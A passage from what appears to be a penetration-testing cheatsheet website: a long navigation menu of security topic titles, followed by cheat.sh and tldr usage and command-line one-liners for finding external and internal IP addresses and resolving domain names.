href="#hashes--bruteforce--decode--vnc" class="nav-list-link">VNC</a></li></ul></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#permissions" class="nav-list-link">Permissions</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#permissions--impersonation" class="nav-list-link">Impersonation</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#permissions--impersonation--windows" class="nav-list-link">Windows</a><ul class="nav-list"><li class="nav-list-item"><a href="#permissions--impersonation--windows--check-privileges" class="nav-list-link">Check Privileges</a></li><li class="nav-list-item"><a href="#permissions--impersonation--windows--juicy-potato" class="nav-list-link">Juicy Potato</a></li><li class="nav-list-item"><a href="#permissions--impersonation--windows--chimichurri---iis-7-7-5" class="nav-list-link">Chimichurri - IIS 7/7.5</a></li><li class="nav-list-item"><a href="#permissions--impersonation--windows--churraskito---iis-6" class="nav-list-link">Churraskito - IIS 6</a></li><li class="nav-list-item"><a href="#permissions--impersonation--windows--churrasco---windows-server-2003---iis-6" class="nav-list-link">Churrasco - Windows Server 2003 - IIS 6</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#permissions--installation" class="nav-list-link">Installation</a><ul class="nav-list"><li class="nav-list-item"><a href="#permissions--installation--windows---msi" class="nav-list-link">Windows - MSI</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#buffer-overflow" class="nav-list-link">Buffer Overflow</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#buffer-overflow--security-features-meaning" class="nav-list-link">Security Features Meaning</a><ul class="nav-list"><li class="nav-list-item"><a href="#buffer-overflow--security-features-meaning--aslr" class="nav-list-link">ASLR</a></li><li class="nav-list-item"><a href="#buffer-overflow--security-features-meaning--pie---pic" class="nav-list-link">PIE / PIC</a></li><li class="nav-list-item"><a href="#buffer-overflow--security-features-meaning--canaries" class="nav-list-link">Canaries</a></li><li class="nav-list-item"><a href="#buffer-overflow--security-features-meaning--dep---nx" class="nav-list-link">DEP / NX</a></li><li class="nav-list-item"><a href="#buffer-overflow--security-features-meaning--relro" class="nav-list-link">RELRO</a></li></ul></li><li class="nav-list-item"><a href="#buffer-overflow--checksec" class="nav-list-link">Checksec</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#buffer-overflow--identify-badchars" class="nav-list-link">Identify Badchars</a><ul class="nav-list"><li class="nav-list-item"><a href="#buffer-overflow--identify-badchars--shell---bash-zsh" class="nav-list-link">Shell - Bash/Zsh</a></li><li class="nav-list-item"><a href="#buffer-overflow--identify-badchars--exploit-bad-characters" class="nav-list-link">exploit-bad-characters</a></li><li class="nav-list-item"><a href="#buffer-overflow--identify-badchars--expdevbadchars" class="nav-list-link">expdevBadChars</a></li><li class="nav-list-item"><a href="#buffer-overflow--identify-badchars--rizin" class="nav-list-link">Rizin</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#buffer-overflow--rizin" class="nav-list-link">Rizin</a><ul class="nav-list"><li class="nav-list-item"><a href="#buffer-overflow--rizin--resources" class="nav-list-link">Resources</a></li><li class="nav-list-item"><a href="#buffer-overflow--rizin--troubleshoot" class="nav-list-link">Troubleshoot</a></li><li class="nav-list-item"><a href="#buffer-overflow--rizin--most-useful-commands" class="nav-list-link">Most useful commands</a></li><li class="nav-list-item"><a href="#buffer-overflow--rizin--control-instr-ptr-program-counter" class="nav-list-link">Control Instr-Ptr/Program-Counter</a></li><li class="nav-list-item"><a href="#buffer-overflow--rizin--locate-jump---gadget-address" class="nav-list-link">Locate Jump / Gadget Address</a></li><li class="nav-list-item"><a href="#buffer-overflow--rizin--memory-execution" class="nav-list-link">Memory Execution</a></li><li class="nav-list-item"><a href="#buffer-overflow--rizin--return-to-libc" class="nav-list-link">Return to libc</a></li><li class="nav-list-item"><a href="#buffer-overflow--rizin--return-to-plt" class="nav-list-link">Return to PLT</a></li><li class="nav-list-item"><a href="#buffer-overflow--rizin--more-advanced-techniques" class="nav-list-link">More Advanced Techniques</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#binaries" class="nav-list-link">Binaries</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#binaries--reading" class="nav-list-link">Reading</a><ul class="nav-list"><li class="nav-list-item"><a href="#binaries--reading--grep" class="nav-list-link">grep</a></li><li class="nav-list-item"><a href="#binaries--reading--strings" class="nav-list-link">strings</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#binaries--tracing" class="nav-list-link">Tracing</a><ul class="nav-list"><li class="nav-list-item"><a href="#binaries--tracing--strace" class="nav-list-link">strace</a></li><li class="nav-list-item"><a href="#binaries--tracing--ltrace" class="nav-list-link">ltrace</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#linux" class="nav-list-link">Linux</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#linux--kernel-exploits" class="nav-list-link">Kernel Exploits</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#linux--kernel-exploits--dirty-cow---cve-2016-5195" class="nav-list-link">Dirty COW - CVE-2016-5195</a><ul class="nav-list"><li class="nav-list-item"><a href="#linux--kernel-exploits--dirty-cow---cve-2016-5195--kernels-affected" class="nav-list-link">Kernels Affected</a></li><li class="nav-list-item"><a href="#linux--kernel-exploits--dirty-cow---cve-2016-5195--effect" class="nav-list-link">Effect</a></li><li class="nav-list-item"><a href="#linux--kernel-exploits--dirty-cow---cve-2016-5195--patched-old-kernels" class="nav-list-link">Patched Old Kernels</a></li><li class="nav-list-item"><a href="#linux--kernel-exploits--dirty-cow---cve-2016-5195--working-exploits" class="nav-list-link">Working Exploits</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#linux--elf-vulnerabilities" class="nav-list-link">ELF Vulnerabilities</a><ul class="nav-list"><li class="nav-list-item"><a href="#linux--elf-vulnerabilities--identification" class="nav-list-link">Identification</a></li><li class="nav-list-item"><a href="#linux--elf-vulnerabilities--rpath" class="nav-list-link">RPATH</a></li><li class="nav-list-item"><a href="#linux--elf-vulnerabilities--runpath" class="nav-list-link">RUNPATH</a></li><li class="nav-list-item"><a href="#linux--elf-vulnerabilities--stack-clash---cve2017-1000379" class="nav-list-link">Stack Clash - CVE2017-1000379</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#linux--elf-vulnerabilities--environment-tampering" class="nav-list-link">Environment Tampering</a><ul class="nav-list"><li class="nav-list-item"><a href="#linux--elf-vulnerabilities--environment-tampering--identification" class="nav-list-link">Identification</a></li><li class="nav-list-item"><a href="#linux--elf-vulnerabilities--environment-tampering--relative-references" class="nav-list-link">Relative References</a></li><li class="nav-list-item"><a href="#linux--elf-vulnerabilities--environment-tampering--absolute-references" class="nav-list-link">Absolute References</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#linux--suid-creation" class="nav-list-link">SUID Creation</a><ul class="nav-list"><li class="nav-list-item"><a href="#linux--suid-creation--set-suid-bit" class="nav-list-link">Set SUID bit</a></li><li class="nav-list-item"><a href="#linux--suid-creation--elf" class="nav-list-link">ELF</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#linux--suid-creation--so-library" class="nav-list-link">SO Library</a><ul class="nav-list"><li class="nav-list-item"><a href="#linux--suid-creation--so-library--ld_preload" class="nav-list-link">LD_PRELOAD</a></li><li class="nav-list-item"><a href="#linux--suid-creation--so-library--missing-library" class="nav-list-link">Missing library</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#linux--tool-privesc" class="nav-list-link">Tool PrivEsc</a><ul class="nav-list"><li class="nav-list-item"><a href="#linux--tool-privesc--gtfobins" class="nav-list-link">GTFObins</a></li><li class="nav-list-item"><a href="#linux--tool-privesc--rvim" class="nav-list-link">rvim</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#linux--capabilities" class="nav-list-link">Capabilities</a><ul class="nav-list"><li class="nav-list-item"><a href="#linux--capabilities--info" class="nav-list-link">Info</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#linux--capabilities--cap_setuid" class="nav-list-link">CAP_SETUID</a><ul class="nav-list"><li class="nav-list-item"><a href="#linux--capabilities--cap_setuid--python" class="nav-list-link">Python</a></li></ul></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#forensics" class="nav-list-link">Forensics</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#forensics--windows" class="nav-list-link">Windows</a><ul class="nav-list"><li class="nav-list-item"><a href="#forensics--windows--registry-hives--dat-files" class="nav-list-link">Registry Hives .dat files</a></li><li class="nav-list-item"><a href="#forensics--windows--internet-explorer--dat-files" class="nav-list-link">Internet Explorer .dat files</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#forensics--windows--emails" class="nav-list-link">Emails</a><ul class="nav-list"><li class="nav-list-item"><a href="#forensics--windows--emails--dbx" class="nav-list-link">DBX</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#forensics--linux" class="nav-list-link">Linux</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#steganography" class="nav-list-link">Steganography</a><ul class="nav-list"><li class="nav-list-item"><a href="#steganography--steghide" class="nav-list-link">Steghide</a></li><li class="nav-list-item"><a href="#steganography--stegsolve" class="nav-list-link">StegSolve</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration" class="nav-list-link">Tricky Configuration</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration--vpn" class="nav-list-link">VPN</a><ul class="nav-list"><li class="nav-list-item"><a href="#tricky-configuration--vpn--nordvpn" class="nav-list-link">NordVPN</a></li></ul></li><li class="nav-list-item"><a href="#tricky-configuration--bruteforce---fuzzing-ranking" class="nav-list-link">Bruteforce / Fuzzing Ranking</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration--msys-for-windows" class="nav-list-link">MSYS for Windows</a><ul class="nav-list"><li class="nav-list-item"><a href="#tricky-configuration--msys-for-windows--download" class="nav-list-link">Download</a></li><li class="nav-list-item"><a href="#tricky-configuration--msys-for-windows--python-cryptography---rust-installation" class="nav-list-link">Python Cryptography / Rust Installation</a></li></ul></li><li class="nav-list-item"><a href="#tricky-configuration--embedded-python-for-windows" class="nav-list-link">Embedded Python for Windows</a></li><li class="nav-list-item"><a href="#tricky-configuration--vnc" class="nav-list-link">VNC</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration--rdp---remote-desktop" class="nav-list-link">RDP - Remote Desktop</a><ul class="nav-list"><li class="nav-list-item"><a href="#tricky-configuration--rdp---remote-desktop--enable" class="nav-list-link">Enable</a></li><li class="nav-list-item"><a href="#tricky-configuration--rdp---remote-desktop--rdp-over-reverse-ssh" class="nav-list-link">RDP over Reverse SSH</a></li><li class="nav-list-item"><a href="#tricky-configuration--rdp---remote-desktop--connect-with-xfreerdp" class="nav-list-link">Connect with XFreeRDP</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration--record-screen" class="nav-list-link">Record Screen</a><ul class="nav-list"><li class="nav-list-item"><a href="#tricky-configuration--record-screen--integrated-gpu" class="nav-list-link">Integrated GPU</a></li><li class="nav-list-item"><a href="#tricky-configuration--record-screen--discrete-gpu" class="nav-list-link">Discrete GPU</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration--record-terminal" class="nav-list-link">Record Terminal</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration--record-terminal--extra" class="nav-list-link">Extra</a><ul class="nav-list"><li class="nav-list-item"><a href="#tricky-configuration--record-terminal--extra--compression" class="nav-list-link">Compression</a></li><li class="nav-list-item"><a href="#tricky-configuration--record-terminal--extra--clean-vt100-ansi-escapes" class="nav-list-link">Clean VT100/ANSI escapes</a></li></ul></li><li class="nav-list-item"><a href="#tricky-configuration--record-terminal--script" class="nav-list-link">Script</a></li><li class="nav-list-item"><a href="#tricky-configuration--record-terminal--ttyrec" class="nav-list-link">TTYrec</a></li><li class="nav-list-item"><a href="#tricky-configuration--record-terminal--ttyrec---perl" class="nav-list-link">TTYrec - Perl</a></li><li class="nav-list-item"><a href="#tricky-configuration--record-terminal--termrec" class="nav-list-link">Termrec</a></li><li class="nav-list-item"><a href="#tricky-configuration--record-terminal--ipbt---replayer" class="nav-list-link">IPBT - Replayer</a></li><li class="nav-list-item"><a href="#tricky-configuration--record-terminal--asciinema" class="nav-list-link">asciinema</a></li><li class="nav-list-item"><a href="#tricky-configuration--record-terminal--conversion---ttyrec----script" class="nav-list-link">Conversion - ttyrec &lt;&gt; script</a></li></ul></li><li class="nav-list-item"><a href="#tricky-configuration--screenshot-full-command-output" class="nav-list-link">Screenshot Full Command Output</a></li><li class="nav-list-item"><a href="#tricky-configuration--ffplay-scale-realtime-input" class="nav-list-link">FFplay Scale Realtime Input</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration--ntop-pf_ring--for-masscan-" class="nav-list-link">NTop PF_RING (for Masscan)</a><ul class="nav-list"><li class="nav-list-item"><a href="#tricky-configuration--ntop-pf_ring--for-masscan---requirements" class="nav-list-link">Requirements</a></li><li class="nav-list-item"><a href="#tricky-configuration--ntop-pf_ring--for-masscan---pre-made-packages" class="nav-list-link">Pre-made packages</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source" class="nav-list-link">Installing from source</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux" class="nav-list-link">Kali Linux</a><ul class="nav-list"><li class="nav-list-item"><a href="#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--dependencies-" class="nav-list-link">Dependencies:</a></li><li class="nav-list-item"><a href="#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--good-to-have" class="nav-list-link">Good to have</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation" class="nav-list-link">Installation</a><ul class="nav-list"><li class="nav-list-item"><a href="#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation--pf_ring-flow-table" class="nav-list-link">PF_RING Flow Table</a></li><li class="nav-list-item"><a href="#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation--pf_ring-zero-copy" class="nav-list-link">PF_RING Zero Copy</a></li></ul></li><li class="nav-list-item"><a href="#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--post-installation-configuration" class="nav-list-link">Post-Installation Configuration</a></li></ul></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration--vmware-vm-maintenance" class="nav-list-link">VMWare VM Maintenance</a><ul class="nav-list"><li class="nav-list-item"><a href="#tricky-configuration--vmware-vm-maintenance--defrag" class="nav-list-link">Defrag</a></li><li class="nav-list-item"><a href="#tricky-configuration--vmware-vm-maintenance--shrink-disk" class="nav-list-link">Shrink Disk</a></li></ul></li><li class="nav-list-item"><a href="#tricky-configuration--pip-cache" class="nav-list-link">Pip Cache</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration--metadata" class="nav-list-link">Metadata</a><ul class="nav-list"><li class="nav-list-item"><a href="#tricky-configuration--metadata--exiftool" class="nav-list-link">exiftool</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration--pdf" class="nav-list-link">PDF</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration--pdf--extract-text" class="nav-list-link">Extract Text</a><ul class="nav-list"><li class="nav-list-item"><a href="#tricky-configuration--pdf--extract-text--pdftotext--poppler-" class="nav-list-link">pdftotext (poppler)</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration--pdf--toc---bookmarks" class="nav-list-link">TOC / Bookmarks</a><ul class="nav-list"><li class="nav-list-item"><a href="#tricky-configuration--pdf--toc---bookmarks--tabula" class="nav-list-link">Tabula</a></li><li class="nav-list-item"><a href="#tricky-configuration--pdf--toc---bookmarks--pdftk" class="nav-list-link">pdftk</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#tricky-configuration--pdf--toc---bookmarks--pdfminer" class="nav-list-link">pdfminer</a><ul class="nav-list"><li class="nav-list-item"><a href="#tricky-configuration--pdf--toc---bookmarks--pdfminer--information" class="nav-list-link">Information</a></li><li class="nav-list-item"><a href="#tricky-configuration--pdf--toc---bookmarks--pdfminer--dumppdf-py" class="nav-list-link">dumppdf.py</a></li></ul></li><li class="nav-list-item"><a href="#tricky-configuration--pdf--toc---bookmarks--ghostscript" class="nav-list-link">Ghostscript</a></li><li class="nav-list-item"><a href="#tricky-configuration--pdf--toc---bookmarks--import---fix-bookmarks-other-pdf" class="nav-list-link">Import + Fix Bookmarks other PDF</a></li></ul></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#compilers" class="nav-list-link">Compilers</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#compilers--python" class="nav-list-link">Python</a><ul class="nav-list"><li class="nav-list-item"><a href="#compilers--python--notes" class="nav-list-link">Notes</a></li><li class="nav-list-item"><a href="#compilers--python--nuitka" class="nav-list-link">Nuitka</a></li><li class="nav-list-item"><a href="#compilers--python--pyinstaller" class="nav-list-link">PyInstaller</a></li><li class="nav-list-item"><a href="#compilers--python--cx_freeze" class="nav-list-link">cx_Freeze</a></li></ul></li></ul></li></ul> </div> </nav> </div> <div class="main" id="top"> <div id="main-header" class="main-header"> <div class="search"> <div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search for forgotten flags" aria-label="Search for forgotten flags" autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label> </div> <div id="search-results" class="search-results"></div> </div> <div class="search-overlay"></div> </div> <div tabindex="0" id="main-content-wrap" class="main-content-wrap"> <div id="main-content" class="main-content" role="main"> <h1 id="cheatsheets"> <a href="#cheatsheets" class="anchor-heading" aria-labelledby="cheatsheets"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Cheatsheets </h1> <h2 id="cheatsheets--cheat-sh"> <a href="#cheatsheets--cheat-sh" class="anchor-heading" aria-labelledby="cheatsheets--cheat-sh"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Cheat.sh </h2> <ul> <li><a href="https://github.com/chubin/cheat.sh">Site</a> - CLI, <a href="https://github.com/chubin/cheat.sh/blob/master/doc/standalone.md">local</a> and <a href="https://cheat.sh">online</a> cheatsheet:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Single query</span>
cht.sh go reverse a list

<span class="c"># Interactive mode</span>
cht.sh <span class="nt">--shell</span>

go reverse a list

<span class="c"># Tool specific search</span>
<span class="nb">cd </span>go

reverse a list

<span class="c"># Copy last result without comments</span>
ccopy

<span class="c"># Search</span>
/~&lt;keyword&gt;   <span class="c"># One level search</span>
/~&lt;keyword&gt;/i <span class="c"># One level insensitive</span>
/~&lt;keyword&gt;/b <span class="c"># One level word-bound</span>
/~&lt;keyword&gt;/r <span class="c"># Recursive search</span>

<span class="c"># Auto-query using clipboard changes</span>
stealth  <span class="c"># Add Q for commands-only</span></code></pre></div></div></li> </ul> <h2 id="cheatsheets--tldr"> <a href="#cheatsheets--tldr" class="anchor-heading" aria-labelledby="cheatsheets--tldr"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> tldr </h2> <ul> <li><a href="https://github.com/tldr-pages/tldr">Site</a> - CLI - Simplified man pages:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tldr &lt;tool&gt;</code></pre></div></div></li> </ul> <h1 id="network-enumeration"> <a href="#network-enumeration" class="anchor-heading" aria-labelledby="network-enumeration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Network Enumeration </h1> <h2 id="network-enumeration--ip"> <a href="#network-enumeration--ip" class="anchor-heading" aria-labelledby="network-enumeration--ip"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> IP </h2> <h3 id="network-enumeration--ip--find-external-ip"> <a href="#network-enumeration--ip--find-external-ip" class="anchor-heading" aria-labelledby="network-enumeration--ip--find-external-ip"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Find External IP </h3> <h4 id="network-enumeration--ip--find-external-ip--dig"> <a href="#network-enumeration--ip--find-external-ip--dig" class="anchor-heading" aria-labelledby="network-enumeration--ip--find-external-ip--dig"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Dig </h4> <ul> <li>By querying Google&#8217;s NS:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dig TXT +short o-o.myaddr.l.google.com @ns1.google.com</code></pre></div></div></li> </ul> <h4 id="network-enumeration--ip--find-external-ip--openssl-s_client"> <a href="#network-enumeration--ip--find-external-ip--openssl-s_client" class="anchor-heading" aria-labelledby="network-enumeration--ip--find-external-ip--openssl-s_client"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> openssl s_client </h4> <ul> <li>By asking ipecho.net:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"GET /plain HTTP/1.0</span><span class="se">\r\n</span><span class="s2">Host: ipecho.net</span><span class="se">\r\n\r\n</span><span class="s2">"</span> | openssl s_client <span class="nt">-connect</span> ipecho.net:443 <span class="nt">-verify_quiet</span> <span class="nt">-quiet</span> 2&gt;/dev/null | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'${G;P}'</span></code></pre></div></div></li> </ul> <h3 id="network-enumeration--ip--find-internal-ip"> <a href="#network-enumeration--ip--find-internal-ip" class="anchor-heading" aria-labelledby="network-enumeration--ip--find-internal-ip"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Find Internal IP </h3> <h4 id="network-enumeration--ip--find-internal-ip--local-subnet"> <a href="#network-enumeration--ip--find-internal-ip--local-subnet" class="anchor-heading" aria-labelledby="network-enumeration--ip--find-internal-ip--local-subnet"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Local Subnet </h4> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'/[[:digit:]]/{:a;N;/LOCAL/!{D;ba};/ 127.0.0/d;s/^[^[:digit:]]*\|.\n.*//gp;q}'</span> /proc/net/fib_trie</code></pre></div></div> <h4 id="network-enumeration--ip--find-internal-ip--get-the-eth0-gateway"> <a href="#network-enumeration--ip--find-internal-ip--get-the-eth0-gateway" class="anchor-heading" aria-labelledby="network-enumeration--ip--find-internal-ip--get-the-eth0-gateway"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Get the eth0 Gateway </h4> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># TODO - Modify to use in scripts</span>
<span class="nb">awk</span> <span class="s1">'/eth0/&amp;&amp;$3{split($3,a,"");while(i++&lt;8)printf"%d.","0x"a[9-++i]a[10-i];print"\b ";exit}'</span> /proc/net/route</code></pre></div></div> <h2 id="network-enumeration--dns-and-hostnames"> <a href="#network-enumeration--dns-and-hostnames" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> DNS and Hostnames </h2> <h3 id="network-enumeration--dns-and-hostnames--domain-resolution"> <a href="#network-enumeration--dns-and-hostnames--domain-resolution" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--domain-resolution"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Domain Resolution </h3> <h4 id="network-enumeration--dns-and-hostnames--domain-resolution--perl"> <a href="#network-enumeration--dns-and-hostnames--domain-resolution--perl" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--domain-resolution--perl"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Perl </h4> <ul> <li>Core Perl - IPv4<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl <span class="nt">-MSocket</span> <span class="nt">-E</span> <span class="s1">'say+inet_ntoa+inet_aton"&lt;domain&gt;"'</span></code></pre></div></div></li> <li>Core Perl - IPv6<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl <span class="nt">-mSocket</span> <span class="nt">-E</span> <span class="s1">'$_?say+Socket::inet_ntop+10,unpack+x8a16,$$_{addr}:""for+Socket::getaddrinfo"&lt;domain&gt;","",{socktype,3,family,10}'</span>
<span class="c"># See below the meaning of magic numbers</span></code></pre></div></div></li> <li>Core Perl - Reverse Resolution<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Use AF_INET6 for IPv6</span>
